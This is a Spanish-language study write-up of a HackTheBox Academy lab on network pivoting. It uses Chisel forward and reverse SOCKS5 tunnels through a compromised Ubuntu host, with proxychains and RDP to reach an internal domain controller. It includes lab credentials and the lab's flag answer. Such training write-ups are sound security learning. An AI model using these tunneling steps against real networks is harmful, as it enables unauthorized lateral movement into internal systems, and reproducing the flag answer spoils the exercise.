Chisel es una herramienta escrita en Go que permite crear túneles TCP/UDP a través de HTTP, cifrados con SSH. 

Consideremos un escenario en el que necesitamos tunelizar nuestro tráfico a un servidor web en la red 172.16.5.0/23 (red interna). Tenemos el controlador de dominio con la dirección 172.16.5.19. Este no es directamente accesible para nuestro host de ataque, ya que este y el controlador de dominio pertenecen a segmentos de red diferentes. Sin embargo, dado que hemos comprometido el servidor Ubuntu, podemos iniciar un servidor Chisel que escuchará en un puerto específico y reenviará nuestro tráfico a la red interna a través del túnel establecido.

Escenario:
- Queremos tunelizar nuestro tráfico a un servidor web ubicado en la red 172.16.5.0/23.

## Instalacion y building de *Chisel*

Nos lo clonamos en la máquina atacante con:

```
Polika4RM@htb[/htb]$ git clone https://github.com/jpillora/chisel.git
```

Necesitaremos tener el lenguaje de programación Go instalado en nuestro sistema para compilar el binario de Chisel. Con Go instalado, podemos acceder a ese directorio y usar go build para compilar el binario de Chisel:

```shell-session
Polika4RM@htb[/htb]$ cd chisel
go build
```

Una vez construido el binario, podemos usar SCP para transferirlo al host pivote del destino.

```
Polika4RM@htb[/htb]$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09 
```

## Chisel Server - Máquina Ubuntu (Pivot Host)
Desde la máquina ubuntu (pivot host), podremos pues iniciar el Chisel Server:
```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

El receptor Chisel detectará las conexiones entrantes en el puerto 1234 mediante SOCKS5 (--socks5) y las reenviará a todas las redes accesibles desde el host pivote. En nuestro caso, el host pivote tiene una interfaz en la red 172.16.5.0/23, lo que nos permitirá conectar con los hosts de esa red.

## Cliente Chisel - Máquina atacante
Podemos iniciar un cliente en nuestro host de ataque y conectarnos al servidor Chisel.
```shell-session
Polika4RM@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

El cliente Chisel ha creado un túnel TCP/UDP a través de HTTP protegido mediante SSH entre el servidor Chisel y el cliente y ha comenzado a escuchar en el puerto 1080. Ahora podemos modificar nuestro archivo proxychains.conf ubicado en /etc/proxychains.conf y agregar el puerto 1080 al final para que podamos usar proxychains para pivotar usando el túnel creado entre el puerto 1080 y el túnel SSH.

```shell-session
Polika4RM@htb[/htb]$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080                <----------

```

Ahora, si usamos proxychains con RDP, podemos conectarnos al DC en la red interna a través del túnel que hemos creado al host Pivot.

```
Polika4RM@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

---

### Chisel Reverse Pivot
En el ejemplo anterior, usamos la máquina comprometida (Ubuntu) como nuestro servidor Chisel, con el puerto 1234. Sin embargo, puede haber escenarios donde las reglas del firewall restrinjan las conexiones entrantes a nuestro objetivo comprometido. En tales casos, podemos usar Chisel con la opción "reverse".

Cuando el servidor Chisel tiene habilitada la opción "--reverse", los remotos pueden prefijarse con "R" para indicar que están revertidos. El servidor escuchará y aceptará conexiones, las cuales se redirigirán a través del cliente que especificó el remoto. Los remotos inversos que especifiquen "R:socks" escucharán en el puerto Socks predeterminado del servidor (1080) y finalizarán la conexión en el proxy SOCKS5 interno del cliente.

El pivot abre una conexión saliente hacia tu atacante. Con --reverse le dices al servidor (tu atacante) “abre un puerto local para mí” — todo lo que llegue a ese puerto en tu atacante se envía por el túnel hacia el pivot, y desde el pivot se conecta a la máquina final.

Iniciaremos el servidor en nuestro host de ataque con la opción "--reverse".

### Inicializando el "Chisel Server" en Máquina atacante
```shell-session
Polika4RM@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Then we connect from the Ubuntu (pivot host) to our attack host, using the option `R:socks`


#### Conectando el Chisel Client de la máquina UBUNTU (Pivot Host)
```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

Podemos usar cualquier editor que queramos para editar el archivo proxychains.conf y luego confirmar nuestros cambios de configuración usando tail.

```shell-session
Polika4RM@htb[/htb]$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

---

**Target: 10.129.150.2**
**SH to  with user "ubuntu" and password "HTB_@cademy_stdnt!"**
**1. Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.**

Realizado mediante Rpivot porque HTB no actualiza las herramientas de sus propias máquinas. No voy a pelearme con versiones antiguas de python.

Respuesta:
```
Th3$eTunne1$@rent8oring!
```

